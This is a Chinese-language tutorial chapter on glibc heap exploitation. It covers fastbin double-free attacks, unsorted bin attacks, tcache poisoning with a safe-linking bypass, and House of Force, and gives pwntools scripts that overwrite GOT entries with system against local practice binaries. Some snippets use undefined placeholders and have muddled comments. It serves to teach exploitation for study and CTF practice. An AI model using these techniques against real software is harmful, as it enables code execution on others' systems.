# 堆溢出与堆利用

### 2.1 ptmalloc内存管理基础

glibc的ptmalloc是Linux系统最常用的堆内存管理器，理解其内部结构是堆利用的基础。

**malloc_chunk结构：**

```c
struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  // 前一个chunk的大小（仅当前一个chunk空闲时有效）
    INTERNAL_SIZE_T      mchunk_size;       // 当前chunk的大小（含头部），低3位为标志位
    struct malloc_chunk* fd;                // 前向指针（仅空闲chunk有效）
    struct malloc_chunk* bk;                // 后向指针（仅空闲chunk有效）
    struct malloc_chunk* fd_nextsize;       // large bin专用
    struct malloc_chunk* bk_nextsize;       // large bin专用
};
```

**size字段标志位：**

| 位 | 名称 | 说明 |
|----|------|------|
| 0 | PREV_INUSE | 前一个chunk是否在使用中 |
| 1 | IS_MMAPPED | 是否通过mmap分配 |
| 2 | NON_MAIN_ARENA | 是否属于非主线程的arena |

**Bins分类：**

| Bin类型 | 大小范围 | 数据结构 | 特点 |
|---------|---------|---------|------|
| Fastbin | 16-128字节(32位)/32-176字节(64位) | 单链表(fd) | LIFO，不合并相邻chunk |
| Small bin | < 1024字节(512大小) | 双链表 | FIFO |
| Large bin | >= 1024字节 | 双链表+size链 | 按大小范围组织 |
| Unsorted bin | 任意大小 | 双链表 | 释放的chunk先放入此处 |
| tcache | 最多1040字节 | 单链表(fd) | 线程本地，优先分配 |

**堆内存布局示例：**

```
低地址                                     高地址
+----------+----------+----------+---------+--------+
| chunk A  | chunk B  | chunk C  | top     | unused |
| (in use) | (freed)  | (in use) | chunk   | space  |
+----------+----------+----------+---------+--------+
            ↑
           fd指向下一个空闲chunk
```

### 2.2 fastbin attack

fastbin attack利用fastbin链表的fd指针进行攻击。

**原理：**

当释放的chunk大小在fastbin范围内时，该chunk被插入fastbin单链表。如果通过堆溢出覆盖fastbin中chunk的fd指针，可以使其指向任意地址，后续malloc将返回该地址。

**漏洞代码：**

```c
#include <stdlib.h>
#include <string.h>

int main() {
    void *a, *b, *c;
    
    a = malloc(0x28);   // fastbin范围
    b = malloc(0x28);
    c = malloc(0x28);
    
    free(a);
    free(b);
    free(a);           // double free! a在fastbin中出现两次
    
    // fastbin: a -> b -> a -> b -> ...
    
    void *d = malloc(0x28);  // 返回a
    void *e = malloc(0x28);  // 返回b
    void *f = malloc(0x28);  // 返回a（但a就是d，我们已控制其内容）
    
    // 通过d控制a的fd指针
    // 设置fd为target地址
    memcpy(d, &target_addr, 8);
    
    void *g = malloc(0x28);  // 返回a（第二次）
    void *h = malloc(0x28);  // 返回target地址！任意地址写
    
    return 0;
}
```

**利用脚本：**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./heap_vuln')

def malloc(size, data):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def free(idx):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

# 分配3个fastbin大小的chunk
malloc(0x28, b'AAAA')   # chunk0
malloc(0x28, b'BBBB')   # chunk1
malloc(0x28, b'CCCC')   # chunk2

# Double Free
free(0)    # fastbin: 0
free(1)    # fastbin: 1 -> 0
free(0)    # fastbin: 0 -> 1 -> 0 -> 1 -> ...

# 目标地址（需要伪造chunk的size字段）
target_addr = 0x602080  # GOT表附近

# 分配并写入target_addr作为fd
malloc(0x28, p64(target_addr))  # 返回chunk0，写入fd=target_addr
# fastbin: 1 -> 0 -> target_addr -> ...

malloc(0x28, b'DDDD')   # 返回chunk1
malloc(0x28, b'EEEE')   # 返回chunk0
malloc(0x28, b'FFFF')   # 返回target_addr！获得任意地址写

p.interactive()
```

### 2.3 unsorted bin attack

unsorted bin attack通过篡改unsorted bin的bk指针，实现任意地址写入一个固定值（unsorted_bin地址）。

**原理：**

当从unsorted bin中取出一个chunk时，会执行：

```c
// 简化的unsorted bin取出代码
victim = unsorted_chunks->bk;
// 从链表中移除
bck = victim->bk;
unsorted_chunks->bk = bck;
bck->fd = unsorted_chunks;  // 向bck->fd写入unsorted_bin地址
```

如果控制了victim->bk，则可以向`(victim->bk + 0x10)`地址写入一个libc地址。

**利用条件：**
- 能控制unsorted bin中chunk的bk指针
- 知道一个可写的目标地址

**利用场景：**
- 覆写global_max_fast变量，使更大的chunk走fastbin路径
- 覆写_IO_list_all指针，为FSOP攻击做准备

```python
from pwn import *

context.arch = 'amd64'

p = process('./heap_vuln')

def malloc(size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    return p.recvline()

def free(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'data:', data)

# 分配不在fastbin范围的chunk
malloc(0x90)   # chunk0 (unsorted bin范围)
malloc(0x20)   # chunk1 (防止与top chunk合并)

free(0)         # chunk0进入unsorted bin

# 通过编辑功能覆盖chunk0的bk指针
target_addr = 0x602060  # global_max_fast地址
edit(0, p64(0) + p64(target_addr))  # 覆盖fd和bk

# 再次分配触发unsorted bin取出
# bck->fd = unsorted_chunks_addr
# 即 *(target_addr + 0x10) = unsorted_bin_addr
malloc(0x90)

# 现在 global_max_fast 被写入了一个很大的值
# 后续释放更大范围的chunk也会进入fastbin
```

### 2.4 tcache攻击

tcache（Thread Local Caching）是glibc 2.26引入的线程级堆缓存机制，大幅提高了分配速度但也带来了新的攻击面。

**tcache结构：**

```c
#define TCACHE_MAX_BINS     64
#define TCACHE_FILL_COUNT    7

typedef struct tcache_entry {
    struct tcache_entry *next;   // 单链表
    struct tcache_perthread_struct *key;  // 防double-free检查
} tcache_entry;

typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];     // 每个bin的chunk计数
    tcache_entry *entries[TCACHE_MAX_BINS]; // 每个bin的链表头
} tcache_perthread_struct;
```

**tcache poisoning攻击：**

与fastbin attack类似，但tcache没有size检查（glibc 2.26-2.29），更容易利用。

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./heap_tcache')

def malloc(size, data=b'A'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def free(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'data:', data)

# 分配chunk
malloc(0x60, b'AAAA')   # idx0
malloc(0x60, b'BBBB')   # idx1
malloc(0x60, b'CCCC')   # idx2

# 释放后进入tcache
free(2)
free(1)
free(0)

# tcache: 0 -> 1 -> 2 -> NULL

# 修改chunk0的next指针为目标地址
# 需要通过UAF或堆溢出修改
# 假设有edit功能可以UAF
target_addr = 0x602010  # GOT表地址
edit(0, p64(target_addr))

# tcache: 0 -> target -> ???

malloc(0x60, b'DDDD')   # 返回chunk0
malloc(0x60, b'EEEE')   # 返回target_addr！获得任意地址写

# 覆写GOT表
edit(target_addr_idx, p64(system_addr))  # 将函数GOT改为system

p.interactive()
```

**glibc 2.32+的tcache安全特性：**
- 引入safe-linking：tcache的next指针与chunk地址做异或存储
- key字段防double-free

**safe-linking绕过：**

```python
# safe-linking: 存储的next = 实际next ^ (chunk_addr >> 12)
# 绕过方法：泄露chunk地址，计算异或值

# 如果目标地址为target，chunk地址为chunk_addr
# 需要写入: target ^ (chunk_addr >> 12)

def protect_ptr(pos, next_ptr):
    """safe-linking编码"""
    return (pos >> 12) ^ next_ptr

# 使用
encoded_target = protect_ptr(chunk_addr, target_addr)
edit(0, p64(encoded_target))
```

### 2.5 House of系列技术

House of系列是高级堆利用技术的集合，每种技术针对不同的场景。

| 技术 | 原理 | 适用版本 | 核心思路 |
|------|------|---------|---------|
| House of Spirit | 伪造chunk并释放 | 多版本 | 在目标地址伪造合法chunk，释放后再次分配 |
| House of Force | 利用top chunk | <2.29 | 覆盖top chunk大小为-1，任意地址分配 |
| House of Lore | 利用smallbin | <2.29 | 篡改smallbin的bk指针 |
| House of Einherjar | 利用prev_size合并 | <2.29 | 伪造prev_size触发chunk合并 |
| House of Orange | 无free利用 | <2.29 | 利用top chunk扩展失败触发unsorted bin |
| House of Storm | unsorted+largebin | <2.29 | 结合unsorted bin和largebin攻击 |

**House of Force示例：**

```c
// 漏洞代码
char *ptr = malloc(8);
ptr[0] = ...; // 堆溢出可以覆盖top chunk的size

// 将top chunk的size覆盖为0xFFFFFFFFFFFFFFFF (-1)
// 之后malloc(任意大小)将扩展top chunk
// 如果malloc(目标地址 - top_chunk地址 - 头部大小)
// 返回的chunk地址就在目标地址处
```

```python
from pwn import *

context.arch = 'amd64'

p = process('./house_of_force')

def malloc(size, data=b'A'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'data:', data)

def malloc_at(addr):
    """计算需要malloc的大小使返回地址为addr"""
    # top_chunk_addr + 8 + size == addr
    # size = addr - top_chunk_addr - 8
    size = addr - top_chunk_addr - 0x10  # 考虑chunk头
    return size

# 假设已知top chunk地址和目标地址
top_chunk_addr = 0x603010
target_addr = 0x602060  # GOT表

# 通过溢出覆盖top chunk size为-1
malloc(0x18, b'A'*0x18 + p64(0xFFFFFFFFFFFFFFFF))

# 计算需要malloc的大小
evil_size = (target_addr - top_chunk_addr) - 0x10
evil_size &= 0xFFFFFFFFFFFFFFFF  # 无符号

# 分配到目标地址
malloc(evil_size, b'/bin/sh\x00')

# 下一次分配返回target_addr
malloc(0x20, p64(system_addr))  # 覆写GOT
```
